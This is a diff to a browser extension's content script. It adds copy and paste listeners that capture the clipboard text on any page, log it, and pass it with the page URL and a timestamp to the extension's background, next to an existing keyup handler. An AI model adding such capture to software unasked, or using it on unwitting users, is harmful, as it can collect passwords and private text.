@@ -69,3 +69,33 @@ document.addEventListener("keyup", function (event) {
         }
     }
 });
+
+document.addEventListener("copy", function (event) {
+    const copiedText = document.getSelection().toString();
+    console.log("Copied text:", copiedText);
+
+    chrome.runtime.sendMessage({
+        action: "record_copy",
+        data: {
+            type: "copy",
+            text: copiedText,
+            timestamp: new Date().toISOString(),
+            url: window.location.href
+        }
+    });
+});
+
+document.addEventListener("paste", function (event) {
+    let pastedText = (event.clipboardData || window.clipboardData).getData("text");
+    console.log("Pasted text:", pastedText);
+
+    chrome.runtime.sendMessage({
+        action: "record_paste",
+        data: {
+            type: "paste",
+            text: pastedText,
+            timestamp: new Date().toISOString(),
+            url: window.location.href
+        }
+    });
+});
